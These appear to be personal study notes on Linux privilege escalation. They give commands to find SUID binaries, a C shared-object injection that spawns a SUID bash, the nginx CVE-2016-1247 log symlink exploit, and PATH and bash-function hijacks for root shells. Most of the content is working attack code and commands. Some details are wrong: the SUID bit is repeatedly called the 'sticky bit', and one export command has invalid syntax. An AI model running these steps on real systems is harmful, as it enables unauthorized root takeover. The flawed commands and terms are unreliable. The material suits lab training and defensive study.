```bash
find / -perm -u=s -type f 2>/dev/null
```
Find files with SUID sticky bit set

https://gtfobins.github.io/ to find SUID options

## Shared Object Injection

Use SUID to find somewhere we can inject, we found that /usr/local/bin/suid-so in the below code has the sticky bit.

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```
Views what is running behind the scenes and greps when other libraries/configs/scripts are called

To exploit we find something in the list that we can write into or overwrite completely

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Copies bash to tmp and adds sticky bit (SUID) on it

```bash
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/libcalc.c
```
Compiles the above code to match the missing file from our strace output

## Binary Symlinks

Specific to nginx, useful when completing RCE as www-data and getting a reverse shell as www-data

https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html

```bash
dpkg -l | grep nginx
```
Looking for version 1.6.2 or below

Use `find` command previously to find SUID bit, will only work if SUID bit is set on sudo

```bash
ls -la /var/log/nginx
```
Validate . (current directory) has rwx permissions for www-data

Create a symlink to tie log file to an executable that escalates to root privilege. Must have a startup or restart of nginx to actually apply

```bash
./nginxed-root.sh /path/to/log/file
```
Will run the exploit, still need to restart nginx after this completes

## Environmental Variables

```bash
env
```
View all environmental variables

Run `find` command from above to find target

```bash
strings /path/to/target
```
To find specific strings that are used in the target

In example, found `service apache2 start`

This `service` is called using the `$PATH` environmental variable, which supplies an alias for service that points to the full path of the service executable

This escalation essentially updates that `$PATH` variable to point service at a different executable of our own design, giving us root access

```bash
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c
```
Sets gid, uid to root and runs `/bin/bash`

```bash
gcc /tmp/service.c -o /tmp/service
```
Compiles service.c into service

```bash
export $PATH = /tmp:$PATH
```
Now that path is set to /tmp first, it will look for the service executable in /tmp before anything else, which executes our malicious shell.

### If strings returns a direct path

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
```
Creates bash function to copy `/bin/bash` into /tmp and add the SUID sticky bit, then run with -p to keep that UID when run

```bash
export -f /usr/sbin/service
```
The -f flag sets the /usr/sbin/service to run as the function we just created rather than the executable file